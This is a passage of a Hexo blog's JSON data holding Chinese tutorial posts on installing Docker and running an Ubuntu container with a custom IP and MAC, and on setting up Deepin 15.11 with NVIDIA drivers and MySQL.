my-ubuntu-img\n```\n\n### 参考\n[https://docs.docker.com/install/linux/docker-ce/ubuntu/](https://docs.docker.com/install/linux/docker-ce/ubuntu/)\n[https://blog.csdn.net/mtgege/article/details/78462290](https://blog.csdn.net/mtgege/article/details/78462290)\n[https://blog.csdn.net/wanghao_0206/article/details/79583325](https://blog.csdn.net/wanghao_0206/article/details/79583325)\n","slug":"Docker安装Ubuntu镜像并保存且修改IP及Mac地址","published":1,"updated":"2024-03-25T07:31:25.855Z","comments":1,"photos":[],"link":"","_id":"cluaufh0p001bthe61s8bab09","content":"<blockquote>\n<p>本文仅作为一个Docker入坑笔记。<br>主要介绍：<br>1、Docker在Linux上的安装配置；<br>2、在Docker容器中安装一个Ubuntu镜像并保存更改；<br>3、以任意IP地址和Mac地址启动刚才安装的Ubuntu镜像。</p>\n</blockquote>\n<h3 id=\"运行环境\"><a href=\"#运行环境\" class=\"headerlink\" title=\"运行环境\"></a>运行环境</h3><p>简介一下我的环境，方便参考：<strong>Linux 4.15.0-64-generic #73~16.04.1-Ubuntu SMP Fri Sep 13 09:56:18 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</strong></p>\n<h3 id=\"Docker安装配置\"><a href=\"#Docker安装配置\" class=\"headerlink\" title=\"Docker安装配置\"></a>Docker安装配置</h3><p>无论何时，都要先找官方文档，对于入门来说，这比任何东西都管用。这里以Ubuntu为例，其他系统类似。<br>起手update源：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br></pre></td></tr></table></figure>\n<p>装一些必要的工具（一般来说不是刚装系统的话，都可以略过此步）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install \\</span><br><span class=\"line\">    apt-transport-https \\</span><br><span class=\"line\">    ca-certificates \\</span><br><span class=\"line\">    curl \\</span><br><span class=\"line\">    gnupg-agent \\</span><br><span class=\"line\">    software-properties-common</span><br></pre></td></tr></table></figure>\n<p>添加官方key：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>\n<p>验证一下搞对没得：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-key fingerprint 0EBFCD88</span><br></pre></td></tr></table></figure>\n<p>如果输出：</p>\n<blockquote>\n<p>pub   rsa4096 2017-02-22 [SCEA]<br>   9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88<br>uid           [ unknown] Docker Release (CE deb) <a href=\"mailto:&#x64;&#111;&#x63;&#x6b;&#x65;&#x72;&#x40;&#100;&#111;&#x63;&#x6b;&#101;&#114;&#46;&#99;&#x6f;&#109;\">&#x64;&#111;&#x63;&#x6b;&#x65;&#x72;&#x40;&#100;&#111;&#x63;&#x6b;&#101;&#114;&#46;&#99;&#x6f;&#109;</a><br>sub   rsa4096 2017-02-22 [S]</p>\n</blockquote>\n<p>就没问题。<br>接下来配置稳定版仓库（这里仅示例x86_64 &#x2F; amd64架构的处理器）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository \\</span><br><span class=\"line\">   <span class=\"string\">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\</span></span><br><span class=\"line\"><span class=\"string\">   <span class=\"subst\">$(lsb_release -cs)</span> \\</span></span><br><span class=\"line\"><span class=\"string\">   stable&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 再更新一下源</span></span><br><span class=\"line\">sudo apt-get update</span><br></pre></td></tr></table></figure>\n<p>妈耶，终于可以安装Docker了，走起：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>\n<p>我安装的时候要下载390MB，看来Docker还是挺大的一个项目。<br>最后测试一下OK不，跑个HelloWorld：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run hello-world</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装Ubuntu镜像\"><a href=\"#安装Ubuntu镜像\" class=\"headerlink\" title=\"安装Ubuntu镜像\"></a>安装Ubuntu镜像</h3><h4 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h4><p>对，我要在Ubuntu系统上的Docker里面再装一个Ubuntu，可以理解成Ubuntu套娃！<br>先搜索一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker search ubuntu</span><br></pre></td></tr></table></figure>\n<p>就可以看到各种Ubuntu镜像，然后我们当然是拉取第一个官方的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker pull ubuntu</span><br></pre></td></tr></table></figure>\n<p>然后查看一下你已有的镜像：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker images</span><br></pre></td></tr></table></figure>\n<p>会看到刚才安装的hello-world和ubuntu。</p>\n<h4 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h4><p>现在我们来运行这个套娃Ubuntu：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -ti ubuntu</span><br></pre></td></tr></table></figure>\n<p>进入之后你的终端就会切换成：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@7c529c6e5b94:/<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<p>这个<strong>7c529c6e5b94</strong>每次都不一样，可以理解成git中的commit id，等会儿保存镜像时需要用到。</p>\n<h4 id=\"保存\"><a href=\"#保存\" class=\"headerlink\" title=\"保存\"></a>保存</h4><p>然后我们在这个Ubuntu镜像中可以瞎搞一些事情，比如安装wget啊，net-tools啊等等。退出套娃Ubuntu：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@7c529c6e5b94:/<span class=\"comment\"># exit</span></span><br></pre></td></tr></table></figure>\n<p>搞完了就可以提交保存了，第一个参数是刚才的id，第二个参数是给镜像设置一个自定义名称，并加上latest的tag：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker commit 7c529c6e5b94 my-ubuntu-img:latest</span><br></pre></td></tr></table></figure>\n<p>下一次再进入自己保存的镜像时直接：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -ti my-ubuntu-img</span><br></pre></td></tr></table></figure>\n<p>即可。</p>\n<h3 id=\"自定义Mac和IP地址\"><a href=\"#自定义Mac和IP地址\" class=\"headerlink\" title=\"自定义Mac和IP地址\"></a>自定义Mac和IP地址</h3><h4 id=\"Mac地址\"><a href=\"#Mac地址\" class=\"headerlink\" title=\"Mac地址\"></a>Mac地址</h4><p>如果想给刚才的套娃Ubuntu设置一个Mac地址，很简单，直接带参数run就行啦：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -ti --mac-address xx:xx:xx:xx:xx:xx my-ubuntu-img</span><br></pre></td></tr></table></figure>\n<p>进入系统之后可以看看是否设置成功：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifconfig -a</span><br><span class=\"line\"><span class=\"comment\"># 如果提示没有ifconfig命令，需要先安装net-tools</span></span><br><span class=\"line\">sudo apt-get install net-tools</span><br></pre></td></tr></table></figure>\n<h4 id=\"IP地址\"><a href=\"#IP地址\" class=\"headerlink\" title=\"IP地址\"></a>IP地址</h4><p>我们需要先在Docker中创建一个自定义网络类型，同时指定网段（这里示例命名为my-net）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker network create --subnet=192.168.0.0/16 my-net</span><br></pre></td></tr></table></figure>\n<p>然后可以通过network命令查看：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker network <span class=\"built_in\">ls</span></span><br></pre></td></tr></table></figure>\n<p>使用自定义的IP启动容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -it --network my-net --ip 192.168.0.2 my-ubuntu-img</span><br></pre></td></tr></table></figure>\n<p>结合上述的Mac地址参数，两者同时修改就是：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -it --mac-address xx:xx:xx:xx:xx:xx --network my-net --ip 192.168.0.2 my-ubuntu-img</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://docs.docker.com/install/linux/docker-ce/ubuntu/\">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a><br><a href=\"https://blog.csdn.net/mtgege/article/details/78462290\">https://blog.csdn.net/mtgege/article/details/78462290</a><br><a href=\"https://blog.csdn.net/wanghao_0206/article/details/79583325\">https://blog.csdn.net/wanghao_0206&#x2F;article&#x2F;details&#x2F;79583325</a></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>本文仅作为一个Docker入坑笔记。<br>主要介绍：<br>1、Docker在Linux上的安装配置；<br>2、在Docker容器中安装一个Ubuntu镜像并保存更改；<br>3、以任意IP地址和Mac地址启动刚才安装的Ubuntu镜像。</p>\n</blockquote>\n<h3 id=\"运行环境\"><a href=\"#运行环境\" class=\"headerlink\" title=\"运行环境\"></a>运行环境</h3><p>简介一下我的环境，方便参考：<strong>Linux 4.15.0-64-generic #73~16.04.1-Ubuntu SMP Fri Sep 13 09:56:18 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</strong></p>\n<h3 id=\"Docker安装配置\"><a href=\"#Docker安装配置\" class=\"headerlink\" title=\"Docker安装配置\"></a>Docker安装配置</h3><p>无论何时，都要先找官方文档，对于入门来说，这比任何东西都管用。这里以Ubuntu为例，其他系统类似。<br>起手update源：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br></pre></td></tr></table></figure>\n<p>装一些必要的工具（一般来说不是刚装系统的话，都可以略过此步）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install \\</span><br><span class=\"line\">    apt-transport-https \\</span><br><span class=\"line\">    ca-certificates \\</span><br><span class=\"line\">    curl \\</span><br><span class=\"line\">    gnupg-agent \\</span><br><span class=\"line\">    software-properties-common</span><br></pre></td></tr></table></figure>\n<p>添加官方key：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>\n<p>验证一下搞对没得：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-key fingerprint 0EBFCD88</span><br></pre></td></tr></table></figure>\n<p>如果输出：</p>\n<blockquote>\n<p>pub   rsa4096 2017-02-22 [SCEA]<br>   9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88<br>uid           [ unknown] Docker Release (CE deb) <a href=\"mailto:&#x64;&#111;&#x63;&#x6b;&#x65;&#x72;&#x40;&#100;&#111;&#x63;&#x6b;&#101;&#114;&#46;&#99;&#x6f;&#109;\">&#x64;&#111;&#x63;&#x6b;&#x65;&#x72;&#x40;&#100;&#111;&#x63;&#x6b;&#101;&#114;&#46;&#99;&#x6f;&#109;</a><br>sub   rsa4096 2017-02-22 [S]</p>\n</blockquote>\n<p>就没问题。<br>接下来配置稳定版仓库（这里仅示例x86_64 &#x2F; amd64架构的处理器）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository \\</span><br><span class=\"line\">   <span class=\"string\">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\</span></span><br><span class=\"line\"><span class=\"string\">   <span class=\"subst\">$(lsb_release -cs)</span> \\</span></span><br><span class=\"line\"><span class=\"string\">   stable&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 再更新一下源</span></span><br><span class=\"line\">sudo apt-get update</span><br></pre></td></tr></table></figure>\n<p>妈耶，终于可以安装Docker了，走起：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>\n<p>我安装的时候要下载390MB，看来Docker还是挺大的一个项目。<br>最后测试一下OK不，跑个HelloWorld：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run hello-world</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装Ubuntu镜像\"><a href=\"#安装Ubuntu镜像\" class=\"headerlink\" title=\"安装Ubuntu镜像\"></a>安装Ubuntu镜像</h3><h4 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h4><p>对，我要在Ubuntu系统上的Docker里面再装一个Ubuntu，可以理解成Ubuntu套娃！<br>先搜索一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker search ubuntu</span><br></pre></td></tr></table></figure>\n<p>就可以看到各种Ubuntu镜像，然后我们当然是拉取第一个官方的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker pull ubuntu</span><br></pre></td></tr></table></figure>\n<p>然后查看一下你已有的镜像：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker images</span><br></pre></td></tr></table></figure>\n<p>会看到刚才安装的hello-world和ubuntu。</p>\n<h4 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h4><p>现在我们来运行这个套娃Ubuntu：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -ti ubuntu</span><br></pre></td></tr></table></figure>\n<p>进入之后你的终端就会切换成：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@7c529c6e5b94:/<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<p>这个<strong>7c529c6e5b94</strong>每次都不一样，可以理解成git中的commit id，等会儿保存镜像时需要用到。</p>\n<h4 id=\"保存\"><a href=\"#保存\" class=\"headerlink\" title=\"保存\"></a>保存</h4><p>然后我们在这个Ubuntu镜像中可以瞎搞一些事情，比如安装wget啊，net-tools啊等等。退出套娃Ubuntu：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@7c529c6e5b94:/<span class=\"comment\"># exit</span></span><br></pre></td></tr></table></figure>\n<p>搞完了就可以提交保存了，第一个参数是刚才的id，第二个参数是给镜像设置一个自定义名称，并加上latest的tag：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker commit 7c529c6e5b94 my-ubuntu-img:latest</span><br></pre></td></tr></table></figure>\n<p>下一次再进入自己保存的镜像时直接：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -ti my-ubuntu-img</span><br></pre></td></tr></table></figure>\n<p>即可。</p>\n<h3 id=\"自定义Mac和IP地址\"><a href=\"#自定义Mac和IP地址\" class=\"headerlink\" title=\"自定义Mac和IP地址\"></a>自定义Mac和IP地址</h3><h4 id=\"Mac地址\"><a href=\"#Mac地址\" class=\"headerlink\" title=\"Mac地址\"></a>Mac地址</h4><p>如果想给刚才的套娃Ubuntu设置一个Mac地址，很简单，直接带参数run就行啦：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -ti --mac-address xx:xx:xx:xx:xx:xx my-ubuntu-img</span><br></pre></td></tr></table></figure>\n<p>进入系统之后可以看看是否设置成功：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifconfig -a</span><br><span class=\"line\"><span class=\"comment\"># 如果提示没有ifconfig命令，需要先安装net-tools</span></span><br><span class=\"line\">sudo apt-get install net-tools</span><br></pre></td></tr></table></figure>\n<h4 id=\"IP地址\"><a href=\"#IP地址\" class=\"headerlink\" title=\"IP地址\"></a>IP地址</h4><p>我们需要先在Docker中创建一个自定义网络类型，同时指定网段（这里示例命名为my-net）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker network create --subnet=192.168.0.0/16 my-net</span><br></pre></td></tr></table></figure>\n<p>然后可以通过network命令查看：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker network <span class=\"built_in\">ls</span></span><br></pre></td></tr></table></figure>\n<p>使用自定义的IP启动容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -it --network my-net --ip 192.168.0.2 my-ubuntu-img</span><br></pre></td></tr></table></figure>\n<p>结合上述的Mac地址参数，两者同时修改就是：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -it --mac-address xx:xx:xx:xx:xx:xx --network my-net --ip 192.168.0.2 my-ubuntu-img</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://docs.docker.com/install/linux/docker-ce/ubuntu/\">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a><br><a href=\"https://blog.csdn.net/mtgege/article/details/78462290\">https://blog.csdn.net/mtgege/article/details/78462290</a><br><a href=\"https://blog.csdn.net/wanghao_0206/article/details/79583325\">https://blog.csdn.net/wanghao_0206&#x2F;article&#x2F;details&#x2F;79583325</a></p>\n"},{"layout":"post","title":"Deepin15.11初体验及问题解决","subtitle":"专治各种小毛病。","date":"2019-10-02T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> Deepin发展也有不少年了，最近还和华为的笔记本合作预装。之前我一直都用Ubuntu做日常开发，现在心血来潮也想折腾一下Deepin哈哈，\n> 本文主要讲从Ubuntu无痛迁移到Deepin的安装过程、N卡显卡驱动等一系列小坑的解决。权当总结吧！\n\n### 下载和制作启动盘\n\n这个就不讲了哈，直接在官网下就行了，包括启动盘制作工具。\n[http://www.deepin.org/download/](http://www.deepin.org/download/)\n\n### 保留数据从Ubuntu迁移到Deepin操作系统\n\n先说一下我的Ubuntu分区挂载情况：我单独挂载了/home和/efi，除此之外都分给了/，平时的重要文件都在home里面，这样在装其他Linux时也方便。\n\n进入Deepin的安装分区步骤时：\n\n- 依然挂载/home到原来的/home上面，且**千万不要选择格式化**；\n- 然后由于我之前的Ubuntu就是UEFI启动方式，所以同样挂载/efi覆盖原来的，这个可以格式化；\n- 最后剩余空间挂载/，并选择格式化，界面上还会提示你Deepin会安装到这里。\n\n**重点：** 在填用户名时一定要和之前Ubuntu的不一样，这样你之前的数据就能保留，安装成功后可以直接copy过来。\n安装完之后记得拔掉U盘，改一下启动顺序。\n\n### 老大难N卡显卡驱动\n\nLinux发行版最头疼的就是驱动问题了，什么闭源驱动开源驱动很多新同学不知道是什么。闭源就是NVIDIA官方的驱动，开源就是热心~~基佬~~网友搞的驱动，一般来说不如闭源的好，官方的肯定兼容性是最好的。\n\n其实大家会发现Deepin有一个显卡驱动管理器，看起来可以切换各种驱动：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191003135452320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n我的Deepin版本是截至目前最新的15.11，但是这里面的闭源驱动版本却只有390，如果是RTX20系列的显卡，估计不支持的，至少我这个2070，选了这个“使用闭源驱动”重启后没有任何作用，分辨率依然还是1024。\n其余两个选项我也试过了，均不起作用，没办法，只能去NVIDIA官方下载驱动了。\n\n官方闭源驱动安装步骤：\n\n1. 先去官网下载对应显卡的Linux驱动：[https://www.geforce.cn/drivers](https://www.geforce.cn/drivers)，下载后是一个.run文件；\n\n2. 老套路，禁用开源驱动，编辑黑名单文件：\n\n   ```bash\n   # Deepin默认的编辑器是deepin-editor\n   # 我这个有个bcm43什么的，不一定都是这个，反正是blacklistxxx.conf\n   sudo deepin-editor /etc/modprobe.d/blacklist-bcm43.conf\n   ```\n\n3. 在文件末尾加入：\n\n   ```bash\n   blacklist nouveau\n   blacklist lbm-nouveau\n   options nouveau modeset=0\n   alias nouveau off\n   alias lbm-nouveau off\n   ```\n\n4. 刷新一下直接重启吧：\n\n   ```bash\n   # 如果之前自己用apt安装了NVIDIA驱动，也最好卸载，否则后面会失败\n   sudo apt autoremove --purge nvidia*\n   # 刷新重启\n   sudo update-initramfs -u\n   reboot\n   ```\n\n5. 重启完了之后按**Ctrl + Alt + F2**进入命令模式，然后：\n\n   ```bash\n   # 关闭图形界面\n   sudo service lightdm stop\n   sudo init 3\n   ```\n\n6. 给你刚才下载好的.run驱动程序赋予执行权限，就可以执行安装了：\n\n   ```bash\n   sudo chmod a+x  ～/Downloads/NVIDIA-Linux-x86_64-430.40.run\n   reboot\n   ```\n\n   安装过程中各种提示，能选是就是，若有提示覆盖安装（Override write之类的），那就选覆盖安装。\n   装完重启大功告成！\n\n### 解决画面撕裂问题\n\n安装好N卡驱动重启后，分辨率就正常了，美滋滋。但我发现一个很不爽的问题就是快速拖动窗口和浏览滚动网页时，会有明显的画面撕裂。猜测是没有开启垂直同步导致丢帧，但是一想我在Ubuntu上面没有问题啊。多半还是驱动问题。\n这里提供一个解决办法：\n\n1. 打开你的NVIDIA X Server Settings，即控制面板，选择左边第2个Display Configuration：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191003135555818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n3. 点右边的Advanced展开高级选项，把第二个勾上：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191003135702221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n4. 最后点Save to X那个就行了。然后记得重启系统。\n\n### 简化编辑器命令\n\n习惯了Ubuntu的gedit的同学会发现Deepin里面没有这个东西，每次输入sudo deepin-editor也太麻烦了，我们可以用alias简化一下：\n\n1. 先打开.bashrc文件：\n\n   ```bash\n   sudo deepin-editor ~/.bashrc\n   ```\n\n2. 追加内容：\n\n   ```bash\n   alias sudo='sudo '\n   alias gedit=deepin-editor\n   ```\n\n3. 保存后刷新一下：\n\n   ```bash\n   source ~/.bashrc\n   # 然后我们就可以这样来打开文件了：\n   sudo gedit xxx.txt\n   ```\n\n### 关于MySQL安装后不知道密码的问题\n\n在Deepin上安装东西还是很方便的，大部分软件都不需要再添加私有源了。\n\n```bash\nsudo apt-get install mysql-server mysql-client\n```\n\n安装MySQL成功后会发现并没有提示设置密码，也没告诉你初始密码。这时候可以先免密登录：\n\n```bash\nsudo mysql -uroot\n```\n\n进入mysql后两步操作给root用户设置密码：\n\n```bash\nupdate mysql.user set plugin=“mysql_native_password” where user=“root”;\nupdate mysql.user set authentication_string=password(‘你的密码，只用改这个地方’) where user='root’and Host = ‘localhost’;\n```\n\n退出后重启一下服务：\n\n```bash\nsudo service mysql restart\n# 然后就可以正常登录了\nmysql -uroot -p\n```\n\n### 搜狗输入法登录问题\n\n如果是QQ号登录，输入账号密码登录貌似不行，用手机QQ扫码登录就可以了。\n\n### 标题栏太高怎么办\n\n[Deepin标题栏太高的解决办法（自定义高度）](https://blog.ysy950803.top/2019/10/10/Deepin%E6%A0%87%E9%A2%98%E6%A0%8F%E5%A4%AA%E9%AB%98%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AB%98%E5%BA%A6/)\n\n### add-apt-repository失败问题\n\n[Deepin系统add-apt-repository失败的问题](https://blog.ysy950803.top/2019/10/28/Deepin%E7%B3%BB%E7%BB%9Fadd-apt-repository%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/)\n\n### 吐槽\n\n**优点**\n总的说来，Deepin还是很漂亮的，而且应用商店里的东西也非常丰富，一键安装，省去不少麻烦。除了显卡驱动要自己弄，其他硬件我觉得支持得都非常好，我的破台式显示器居然可以在控制中心里调亮度，在Ubuntu上就不行。真的是一个让Linux走近千万家的系统。\n就流畅性而言，也没有感到和Ubuntu有什么差距，只是刚换过来，有一些操作习惯可能会有些许不同，适应几天就顺手了。\n\n**槽点**\n以目前这个版本（15.11）来说，我最大的槽点应该就是标题栏了，实在太粗了，最大化之后一个标题栏就要占两行代码的位置，而且不能自定义高度，希望后续版本有改进。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191003135612820.png)\n还有deepin-wine版微信每次重新启动后不能保存上一次的自定义窗口大小，在Ubuntu上都不会这样。\n酸酸乳PAC模式在Deepin上好像有问题，我发现先开全局模式再开PAC就能解决。\n\n### 最后\n\n相比Ubuntu，Deepin还是有很多不同和亮点的，后面如果再想到什么再追加吧。\n","source":"_posts/2019-10-03-Deepin15.11初体验及问题解决.md","raw":"---\nlayout:     post\ntitle:      